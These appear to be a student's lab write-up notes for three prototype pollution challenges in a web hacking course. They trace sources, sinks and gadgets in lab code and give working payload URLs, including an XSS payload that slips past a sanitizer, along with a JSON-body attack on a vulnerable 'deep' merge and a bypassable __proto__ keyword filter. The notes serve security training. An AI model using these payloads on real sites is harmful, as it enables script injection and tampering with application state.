# Challenge 01
Finding the source:
	We can find user input in the title filter text
### Finding the sink and source
Upon inspecting the code we can see an unused feature where the url params are used as user settings by
location.search.substring

```js
        // Use URL parameters as user settings
let userSettings = $.deparam(location.search.substring(1));
let mergedSettings = Object.assign({}, defaultSettings, userSettings);

```
Our source is param (1)
Which affects directly our sink mergedSettings, thanks to the object assign function


Then gets merged with the defaultsettings object

If the passed param is "message", it gets sanitized and rendered in the site

```js
       // Protection against XSS via the message parameter
    if (Object.prototype.hasOwnProperty.call(userSettings, 'message')) {
            mergedSettings.message = sanitizeHTML(userSettings.message);
        }

```


### Finding the gadget
In this case, our gadget is most likely the rendered message

We can see that we are able to pollute all the way to the object prototype
![[awh-proto1-1.png]]

So now every object in the site has the property message, including the mergedSettings.message gadget. This allows us to skip the sanitize check

![[awh-proto1-2.png]]

# Challenge 02
### Finding a source
Query params
![[awh-proto-2-1.png]]

### Finding a sink
userPreferences object merges with current preferences object
![[awh-proto-2-2.png]]


### Finding a gadget
Dynamic message rendered from Object {}

![[awh-proto-2-3.png]]

On first attempt to prototype pollute I got the following console error


```
file:///home/kali/advancedwebhacking/AWH-PP-Lab3-challenge/index.html?updateSettings=__proto__[asd]=%22asd%22
```

![[awh-proto-2-4.png]]


Then I decided to look fuhrter into the code to see what happened

From the sink we see the following logic:
1. getQueryParams (source) - fetches the value of whatever updateSettings has
2. loads local storage preferences
3. Merges localstorage and updateSettings object
4. SavePreferences()
	1. Save preferences uses a JSON object, so we must send our object in that notation

Doing this we can pollute the prototype

```
file:///home/kali/advancedwebhacking/AWH-PP-Lab3-challenge/index.html?updateSettings={%22__proto__%22:{%22message%22:%22dassdasd%22}}
```

![[awh-proto-2-5.png]]


```
file:///home/kali/advancedwebhacking/AWH-PP-Lab3-challenge/index.html?updateSettings={%22__proto__%22:{%22message%22:%22%3Cimg%20src=x%20onerror=prompt(%27pwned%27)%3E%22}}
```

![[awh-proto-2-6.png]]



##### npm audit
Its usefull for looking into known vulnerabilities for  libraries


### Challenge 03
First thing we can do is npm audit since we have access to source code
we find a vulnerable dependency on deep 
![[awh-proto-3-1.png]]

This makes it fairly straight forward

The whole application is contained into a single js file, this file contains one reference of deep, used to make a copy from an  object to another object. The request object merges into the taskDefaults params

```js
app.post("/tasks/edit/:id", (req, res) => {
	const taskId = req.params.id;
	const userId = req.session.userId;
	const isAdmin = req.session.role === "admin";

	let taskDefaults = {
		title: "",
		description: "",
		priority: "",
		tags: "",
		deadline: "",
		status: "",
	};

	taskDefaults = deep.extend(taskDefaults, req.body);
```
If we make the request as its meant to, we will hit a wall, as it only merges the param strings into the object

![[awh-proto-3-2.png]]

Since this application uses body-parser, we can just send a json object in the request and it will get converted on the server, for this we need to change the request content type header into application/json

![[awh-proto-3-3.png]]

This will get merged into the object, and get passed all the way to the object prototype in the chain

![[awh-3-4.png]]

###### Things to note
This app had filters, but these were only applicable on the front end so I decided to upright ignore them

```js
function parseQueryString(queryString) {
    const params = {};
    const urlParams = new URLSearchParams(queryString);
    const blockedKeywords = ["__proto__", "constructor", "prototype"];

    function filterAndConcatenate(key) {
        let filteredKey = key;

        blockedKeywords.forEach(blocked => {
            filteredKey = filteredKey.split(blocked).join("");
        });
        
        return filteredKey; 
    }

    urlParams.forEach((value, key) => {
        const keys = key.split("[").map(k => k.replace("]", ""));
        const filteredKeys = keys.map(filterAndConcatenate);

        filteredKeys.reduce((acc, cur, idx) => {
            if (idx === filteredKeys.length - 1) {
                acc[cur] = value;
            } else {
                acc[cur] = acc[cur] || {};
            }
            return acc[cur];
        }, params);
    });

    return params;
}


function merge(target, source) {
	for (const key in source) {
		if (source[key] && typeof source[key] === "object") {
			if (!target[key]) {
				target[key] = {};
			}
			merge(target[key], source[key]);
		} else {
			target[key] = source[key];
		}
	}
	return target;
}

```
This app also had many technologies, such as ejs templates and jquery, so I don't discard an XSS trough prototype pollution too



